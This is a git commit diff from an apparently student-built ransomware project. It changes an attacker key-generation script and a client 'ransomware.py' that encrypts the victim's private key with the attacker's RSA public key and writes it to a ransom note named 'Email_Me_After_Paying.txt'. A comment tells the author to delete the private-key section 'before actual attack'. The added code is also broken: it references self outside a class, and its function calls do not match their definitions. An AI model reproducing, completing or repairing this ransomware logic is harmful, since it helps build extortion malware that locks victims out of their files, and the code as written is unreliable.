fe4c10c68a391784d1e11e34cff1b5ba6a01515f
Sri Tammineni <sritammineni31@gmail.com>
2021-03-23 00:12:23 -0500

    Function to encrypt larger file with RSA by breaking them to smaller chunks. Updated all RSA keys to PEM encoding.

--- attacker.py
+++ attacker.py
@@ -2,6 +2,8 @@ import os
 from cryptography.hazmat.primitives.asymmetric import rsa
 from cryptography.hazmat.backends import default_backend as crypto_default_backend
 from cryptography.hazmat.primitives import serialization as crypto_serialization
+from cryptography.hazmat.primitives.asymmetric import padding as crypto_padding
+from cryptography.hazmat.primitives import hashes as crypto_hashes
 
 
 def is_non_zero_file(fpath):
@@ -22,27 +24,46 @@ def genattackerkeys():
     else:
         privkeypathstring = dest_path + '/private.pem'
         pubkeypathstring = dest_path + '/public.pem'
-        key = rsa.generate_private_key(
+        private_key = rsa.generate_private_key(
             backend=crypto_default_backend(),
             public_exponent=65537,
-            key_size=2048
+            key_size=4096
         )
+        public_key = private_key.public_key()
 
-        private_key = key.private_bytes(
+        private_key_pem = private_key.private_bytes(
             crypto_serialization.Encoding.PEM,
             crypto_serialization.PrivateFormat.PKCS8,
             crypto_serialization.NoEncryption())
         with open(privkeypathstring, 'wb') as f:
-            f.write(private_key)
+            f.write(private_key_pem)
 
-        public_key = key.public_key().public_bytes(
-            crypto_serialization.Encoding.OpenSSH,
-            crypto_serialization.PublicFormat.OpenSSH
+        public_key_pem = public_key.public_bytes(
+            crypto_serialization.Encoding.PEM,
+            crypto_serialization.PublicFormat.SubjectPublicKeyInfo
         )
         with open(pubkeypathstring, 'wb') as f:
-            f.write(public_key)
+            f.write(public_key_pem)
+
+
+def encrypt_data():
+    f = open("./testFiles/f1.txt", 'rb')
+    testfile = f.read()
+    f.close()
+    print(testfile)
+    with open("./public.pem", "rb") as key_file:
+        attacker_public_key = crypto_serialization.load_pem_public_key(key_file.read(), backend=crypto_default_backend())
+        enc_text = attacker_public_key.encrypt(testfile, crypto_padding.OAEP(
+            mgf=crypto_padding.MGF1(
+                algorithm=crypto_hashes.SHA256()),
+            algorithm=crypto_hashes.SHA256(),
+            label=None
+        ))
+    print(enc_text)
 
 
 # Press the green button in the gutter to run the script.
 if __name__ == '__main__':
-    genattackerkeys()
+    print("Keys have been generated.")
+    # genattackerkeys()
+    # encrypt_data()
--- targetclient/ransomware.py
+++ targetclient/ransomware.py
@@ -1,3 +1,6 @@
+import base64
+import sys
+
 from cryptography.hazmat.primitives.asymmetric import rsa
 from cryptography.hazmat.backends import default_backend as crypto_default_backend
 from cryptography.hazmat.primitives import serialization as crypto_serialization
@@ -8,21 +11,21 @@ from pathlib import Path
 
 class Ransomware:
     def __init__(self):
-        self.pubkey = None
-        self.privkey = None
+        self.pubkey_pem = None
+        self.privkey_pem = None
         self.attacker_public_key = None
 
-    def generate_keys(self):
-        key = rsa.generate_private_key(
+    def generate_asy_keys(self):
+        private_key = rsa.generate_private_key(
             backend=crypto_default_backend(),
             public_exponent=65537,
             key_size=2048
         )
-        self.pubkey = key.public_key().public_bytes(
-            crypto_serialization.Encoding.OpenSSH,
-            crypto_serialization.PublicFormat.OpenSSH
+        self.pubkey_pem = private_key.public_key().public_bytes(
+            crypto_serialization.Encoding.PEM,
+            crypto_serialization.PublicFormat.SubjectPublicKeyInfo
         )
-        self.privkey = key.private_bytes(
+        self.privkey_pem = private_key.private_bytes(
             crypto_serialization.Encoding.PEM,
             crypto_serialization.PrivateFormat.PKCS8,
             crypto_serialization.NoEncryption())
@@ -30,33 +33,64 @@ class Ransomware:
     # Writes clients both keys to the disk. Delete private key section before actual attack.
     def write_keys(self):
         with open('private_key.txt', 'wb') as f1:
-            f1.write(self.privkey)
+            f1.write(self.privkey_pem)
         with open('public_key.txt', 'wb') as f2:
-            f2.write(self.pubkey)
+            f2.write(self.pubkey_pem)
 
     def encrypt_private_key(self):
+        sys.getsizeof(self.privkey_pem)
         with open('enc_private_key.txt', 'wb') as f:
             with open("./public.pem", "rb") as key_file:
-                self.attacker_public_key = crypto_serialization.load_ssh_public_key(key_file.read(), backend=crypto_default_backend())
-                enc_private_key = self.attacker_public_key.encrypt(self.privkey,
-                                                                   crypto_padding.OAEP(
-                                                                       mgf=crypto_padding.MGF1(
-                                                                           algorithm=crypto_hashes.SHA256()),
-                                                                       algorithm=crypto_hashes.SHA256(),
-                                                                       label=None
-                                                                   )
-                                                                   )
+                self.attacker_public_key = crypto_serialization.load_pem_public_key(key_file.read(),
+                                                                                    backend=crypto_default_backend())
+                enc_private_key = self.attacker_public_key.encrypt(self.privkey_pem, crypto_padding.OAEP(
+                    mgf=crypto_padding.MGF1(
+                        algorithm=crypto_hashes.SHA256()),
+                    algorithm=crypto_hashes.SHA256(),
+                    label=None
+                ))
             f.write(enc_private_key)
         with open(Path.home() + "/Email_Me_After_Paying.txt", "wb") as fa:
             fa.write(enc_private_key)
-        self.privkey = None
+        self.privkey_pem = None
+
+    def enc_private_key(self):
+        with open("./public.pem", "rb") as key_file:
+            self.attacker_public_key = crypto_serialization.load_pem_public_key(key_file.read(),
+                                                                                backend=crypto_default_backend())
+        encrypt_blob(self.privkey_pem, self.attacker_public_key)
+        self.privkey_pem = None
+
+
+def encrypt_blob(fileblob):
+    chunk_size = 100
+    offset = 0
+    end_loop = False
+    encrypted = b""
+    while not end_loop:
+        chunk = fileblob[offset: offset + chunk_size]
+        if len(chunk) % chunk_size != 0:
+            end_loop = True
+            chunk += b" " * (chunk_size - len(chunk))
+        print(chunk)
+        enc_chunk = self.attacker_public_key.encrypt(chunk, crypto_padding.OAEP(
+            mgf=crypto_padding.MGF1(
+                algorithm=crypto_hashes.SHA256()),
+            algorithm=crypto_hashes.SHA256(),
+            label=None
+        ))
+        encrypted += enc_chunk
+        offset += chunk_size
+    encrypted_blob = base64.b64encode(encrypted)
+    with open("./Email_Me_After_Paying.txt", "wb") as fa:
+        fa.write(encrypted_blob)
 
 
 def main():
     foo = Ransomware()
-    foo.generate_keys()
+    foo.generate_asy_keys()
     foo.write_keys()
-    foo.encrypt_private_key()
+    foo.encrypt_blob()
 
 
 if __name__ == '__main__':
